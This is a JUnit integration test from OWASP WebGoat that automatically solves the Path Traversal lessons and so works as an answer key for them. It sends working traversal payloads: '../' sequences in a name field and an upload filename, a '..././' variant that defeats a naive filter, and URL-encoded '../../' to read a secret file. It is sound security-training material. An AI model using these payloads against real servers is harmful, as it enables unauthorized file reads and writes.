package org.owasp.webgoat;

import io.restassured.RestAssured;
import lombok.SneakyThrows;

import org.hamcrest.CoreMatchers;
import org.junit.*;
import org.junit.rules.TemporaryFolder;
import org.junit.runners.MethodSorters;
import org.springframework.security.core.token.Sha512DigestUtils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Map;

@FixMethodOrder(MethodSorters.NAME_ASCENDING)
public class PathTraversalTest extends IntegrationTest {

    @Rule
    public TemporaryFolder temporaryFolder = new TemporaryFolder();
    
    private File fileToUpload = null;
    private static String cookieAccrossTests = null;

    @Before
    @SneakyThrows
    public void init() {
    	
    	if (null == cookieAccrossTests) {
    		super.login();
    		cookieAccrossTests = getWebGoatCookie();
    	}
    	setWebGoatCookie(cookieAccrossTests);
    	fileToUpload = temporaryFolder.newFile("test.jpg");
        Files.write(fileToUpload.toPath(), "This is a test" .getBytes());
        fileToUpload.deleteOnExit();
    }
    
    @Test
    public void assignment1() throws IOException {    	
        startLesson("/PathTraversal");        

        Assert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFile", "test.jpg", Files.readAllBytes(fileToUpload.toPath()))
                        .param("fullName", "../John Doe")
                        .post("/WebGoat/PathTraversal/profile-upload")
                        .then()                        
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }

    @Test
    public void assignment2() throws IOException {
        Assert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFileFix", "test.jpg", Files.readAllBytes(fileToUpload.toPath()))
                        .param("fullNameFix", "..././John Doe")
                        .post("/WebGoat/PathTraversal/profile-upload-fix")
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }

    @Test
    public void assignment3() throws IOException {
        Assert.assertThat(
                RestAssured.given()
                        .when()
                        .relaxedHTTPSValidation()
                        .cookie("JSESSIONID", getWebGoatCookie())
                        .multiPart("uploadedFileRemoveUserInput", "../test.jpg", Files.readAllBytes(fileToUpload.toPath()))
                        .post("/WebGoat/PathTraversal/profile-upload-remove-user-input")
                        .then()
                        .statusCode(200)
                        .extract().path("lessonCompleted"), CoreMatchers.is(true));
    }

    @Test
    public void assignment4() throws IOException {
        var uri = "/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret";
        RestAssured.given().urlEncodingEnabled(false)
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(uri)
                .then()
                .statusCode(200)
                .content(CoreMatchers.is("You found it submit the SHA-512 hash of your username as answer"));

        checkAssignment("/WebGoat/PathTraversal/random", Map.of("secret", Sha512DigestUtils.shaHex(getWebgoatUser())), true);
        checkResults("/PathTraversal");
    }
}
